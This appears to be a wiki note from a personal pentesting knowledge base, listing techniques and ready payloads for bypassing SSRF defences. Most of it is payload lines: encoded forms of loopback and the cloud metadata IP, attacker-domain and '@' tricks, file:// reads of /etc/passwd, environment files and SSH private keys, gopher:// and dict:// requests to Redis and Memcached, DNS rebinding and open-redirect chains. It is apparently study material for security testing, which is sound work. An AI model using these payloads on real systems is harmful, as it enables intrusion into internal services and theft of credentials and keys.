# SSRF Bypass Techniques

← [[SSRF-Overview]]

---

Apps try to block SSRF with allowlists, denylists, and input validation. Here's how to get around them.

For quick reference payloads, see [[SSRF-Bypass]] cheatsheet.

---

## Bypass Type 1 — Denylist-Based Filtering

The app blocks known internal addresses (`127.0.0.1`, `localhost`, `169.254.169.254`). Bypass by representing the same address differently.

### IP Representation

```
127.0.0.1       → 127.1 (shorthand)
127.0.0.1       → 2130706433 (decimal)
127.0.0.1       → 0x7f000001 (hex)
127.0.0.1       → 0177.0.0.1 (octal)
127.0.0.1       → 017700000001 (full octal)
127.0.0.1       → [::ffff:7f00:1] (IPv4-mapped IPv6)
127.0.0.1       → [::ffff:127.0.0.1]
127.0.0.1       → [::1] (IPv6 loopback)
0.0.0.0         → 0 (resolves to localhost on many systems)
```

### Domain-Based

```
127.0.0.1.nip.io   → resolves to 127.0.0.1 (wildcard DNS service)
localtest.me       → resolves to 127.0.0.1
spoofed.attacker.com → point your domain A record to 127.0.0.1
```

### URL Encoding

```
http://%31%32%37%2e%30%2e%30%2e%31/
http://127.0.0.1%00attacker.com/    ← null byte (some parsers)
```

---

## Bypass Type 2 — Allowlist-Based Filtering

The app only allows requests to specific domains. Bypass by making the URL look like it's going to the allowed domain.

### `@` Symbol Trick

URL format: `scheme://user:pass@host/path`
The `@` separates credentials from the hostname. Some parsers see `attacker.com` before the `@` as the host:

```
https://trusted.com@127.0.0.1/
https://allowed.com@internal-service.com/
```

Most modern parsers handle this correctly, but worth testing.

### Fragment Trick

The fragment (`#`) is not sent to the server. Some validators check the full URL including fragment:

```
https://allowed.com#@127.0.0.1/
https://allowed.com#.attacker.com/
```

### Subdomain Trick

If validator only checks that the URL contains `allowed.com`:

```
https://allowed.com.attacker.com/
https://attacker.com?allowed.com
https://attacker.com/allowed.com
```

### Path Traversal on Allowed Host

If the app allowlists a specific path on a host:

```
# Allowed: https://example.com/images/*
https://example.com/images/../../../api/internal
```

---

## Bypass Type 3 — Protocol Restriction

App only allows `http://` and `https://`. Try other schemes if they're not explicitly blocked.

### `file://` — Local File Read

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/www/html/config.php
file:///home/ubuntu/.ssh/id_rsa
```

### `dict://` — Dictionary Protocol

Useful for port scanning and probing services that speak line-based protocols:

```
dict://127.0.0.1:6379/info    ← Redis INFO command
dict://127.0.0.1:11211/stats  ← Memcached stats
```

### `gopher://` — Raw TCP

The most powerful SSRF scheme. Lets you craft raw TCP data to send to any service.

Format: `gopher://host:port/_DATA` (data is URL-encoded)

```
# Redis: set a key
gopher://127.0.0.1:6379/_SET%20mykey%20myvalue%0D%0A

# HTTP request to internal service (when direct HTTP is blocked)
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A
```

Use [Gopherus](https://github.com/tarunkant/Gopherus) to generate Gopher payloads for Redis, MySQL, PostgreSQL, FastCGI, SMTP, and more.

---

## Bypass Type 4 — DNS Rebinding

The app resolves the hostname once for validation, and once for the actual request. In between, you change the DNS record.

1. App queries DNS for `attacker.com` → returns legitimate IP (passes check)
2. You change the DNS record to `127.0.0.1`
3. App makes the actual request, queries DNS again → gets `127.0.0.1`

Tools: `singularity`, `rebind.network`, custom DNS server.

Harder to pull off but very powerful against robust SSRF filters.

---

## Bypass Type 5 — Open Redirect Chains

If the app follows redirects and only validates the initial URL:

```
1. Find open redirect on a trusted/allowed domain:
   https://allowed.com/redirect?url=http://169.254.169.254/

2. Use that as your SSRF URL:
   url=https://allowed.com/redirect?url=http://169.254.169.254/

3. App validates: "allowed.com" → OK
4. App fetches → 302 → internal metadata endpoint
```

---

## Bypass Type 6 — Time of Check / Time of Use (TOCTOU)

App validates the URL, then asynchronously fetches it. In between, DNS changes.

This is the DNS rebinding scenario — if the app doesn't re-validate after following redirects or after a delay.

---

## WAF Bypass for SSRF

Some WAFs specifically block access to metadata IPs. Encoding tricks:

```
# AWS metadata: 169.254.169.254
169.254.169.254    (decimal)
http://2852039166/  (decimal equivalent)
http://0xa9fea9fe/  (hex)
http://0251.0376.0251.0376/  (octal)
http://169.254.169.254.nip.io/  (via DNS)
```

---

*Back to [[SSRF-Overview]] | Quick reference: [[SSRF-Bypass]] cheatsheet*

*Sources: PayloadsAllTheThings, PortSwigger Web Security Academy, HowToHunt*
